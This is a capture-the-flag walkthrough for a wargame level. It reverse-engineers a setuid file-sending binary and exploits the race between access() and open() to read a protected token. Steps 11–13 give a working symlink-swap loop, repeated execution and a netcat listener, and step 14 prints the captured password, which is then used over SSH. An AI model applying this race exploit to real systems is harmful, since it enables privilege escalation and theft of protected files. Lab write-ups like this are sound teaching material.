# level10

## Steps

1. __Action__ (Guest): list the files present in the `level10` user's home directory
	```sh
	ls -A
	```

2. __Observation__ (Guest): the previous command reveals 2 files possibly of interest,
	named `level10` and `token`
	```
	.bash_logout  .bashrc  .profile  level10  token
	```

3. __Action__ (Guest): check the type of the `level10` file
	```sh
	file -b level10
	```

4. __Observation__ (Guest): the previous command reveals that the `level10` file
	is an ELF 32-bits executable
	```
	setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf7e21fb68568fa57d6317d0535b97d9fca66f841, not stripped
	```

5. __Action__ (Guest): check the file access control list of both `level10` and `token` files
	```sh
	getfacl level10 token
	```

6. __Observation__ (Guest): the previous command reveals that:
	- the `level10` file:
		- is readable by the `level10` user
		- is executable by the `level10` user
		- is owned by the `flag10` user
		- has the `setuid` bit enabled

	- the `token` file:
		- is readable only by the `flag10` user

	```
	# file: level10
	# owner: flag10
	# group: level10
	# flags: ss-
	user::rwx
	group::---
	group:level10:r-x
	group:flag10:r-x
	mask::r-x
	other::r-x

	# file: token
	# owner: flag10
	# group: flag10
	user::rw-
	group::---
	other::---
	```

7. __Action__ (Host): copy the `level10` file from the virtual machine
	```sh
	sshpass -f level09/flag \
		scp -P 4242 level10@192.168.122.214:level10 /tmp
	```

8. __Action__ (Host): decompile the `level10` file using [dogbolt](https://dogbolt.org/)
	and manually improve the lisibility of the decompiled code

9. __Observation__ (Host): after reverse engineering the `level10` file, we obtain the following
	C code, which takes a filename and a hostname as arguments, checks the access to the file
	by the user, connects to the host on port `6969`, sends a banner message, reads the content
	of the file and sends it to the connected host
	```c
	#include <arpa/inet.h>
	#include <errno.h>
	#include <netinet/in.h>
	#include <stdio.h>
	#include <stdlib.h>
	#include <string.h>
	#include <sys/socket.h>
	#include <unistd.h>

	#define BANNER (char const []){'.', '*', '(', ' ', ')', '*', '.', '\n'}

	int main(int const ac, char const *const *const av) {
		if (ac <= 2) {
			printf("%s file host\n\tsends file to host if you have access to it\n", av[0]);
			exit(EXIT_FAILURE);
		}
		if (access(av[1], R_OK) == -1) {
			printf("You don't have access to %s\n", av[1]);
			exit(EXIT_FAILURE);
		}

		printf("Connecting to %s:6969 .. ", av[2]);
		fflush(stdout);

		int const sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
		struct sockaddr const addr = {
			.sa_family = AF_INET,
			.sa_data = {0},
		};

		inet_addr(av[2]);
		htons(6969);
		if (connect(sock_fd, &addr, sizeof(addr)) == -1) {
			printf("Unable to connect to host %s\n", av[2]);
			exit(EXIT_FAILURE);
		}
		if (write(sock_fd, BANNER, sizeof(BANNER)) == -1) {
			printf("Unable to write banner to host %s\n", av[2]);
			exit(EXIT_FAILURE);
		}
		printf("Connected!\nSending file .. ");
		fflush(stdout);

		int const fd = open(av[1], O_RDONLY);

		if (fd == -1) {
			puts("Damn. Unable to open file");
			exit(EXIT_FAILURE);
		}

		char    buffer[4096];
		ssize_t number_of_bytes_read = read(fd, &buffer, sizeof(buffer));

		if (number_of_bytes_read == -1) {
			printf("Unable to read from file: %s\n", strerror(errno));
			exit(EXIT_FAILURE);
		}
		write(sock_fd, &buffer, number_of_bytes_read);
		puts("wrote file!");
		exit(EXIT_SUCCESS);
		__builtin_unreachable();
	}
	```
	It looks like we have to exploit the `access` command, here's what the man says:
	```
	Warning: Using access() to check if a user is authorized to, for example,
	open a file before actually doing so using open(2) creates a security hole,
	because the user might exploit the short time interval between checking and
	opening the file to manipulate it.
	```

10. __Action__ (Host): remove the `level10` file
	```sh
	rm /tmp/level10
	```

11. __Action__ (Guest): create a symbolic link that points alternatively to the `token` file
	and the `null` file located in the `/dev` directory
	```sh
	while true; do ln -fs ~/token /tmp/symlink; ln -fs /dev/null /tmp/symlink; done &
	```

12. __Action__ (Guest): execute repeatedly the `level10` file with the `symlink` file
	as the first argument and the localhost IP address as the second argument
	```sh
	while true; do /home/user/level10/level10 /tmp/symlink 127.0.0.1; done >/dev/null &
	```

13. __Action__ (Guest): listen on the port `6969` for the first non-banner message
	```sh
	nc -lk 6969 | grep -m 1 -v '.*( )*.'
	```

14. __Observation__ (Guest C): the content of the `token` file appears on stdout:  
	`woupa2yuojeeaaed06riuj63c`

15. __Action__ (Guest): terminate the running subprocesses
	```sh
	pkill -P $$
	```

16. __Action__ (Guest): remove the `symlink` symbolic link and the `empty` file
	```sh
	rm /tmp/{'symlink','empty'}
	```

17. __Action__ (Host): run the `getflag` command as the `flag10` user
	and save the token in the `flag` file
	```sh
	sshpass -p woupa2yuojeeaaed06riuj63c 2>/dev/null \
		ssh -p 4242 flag10@192.168.122.214 \
			getflag \
	| egrep -o '[^ ]+$' >level10/flag
	```
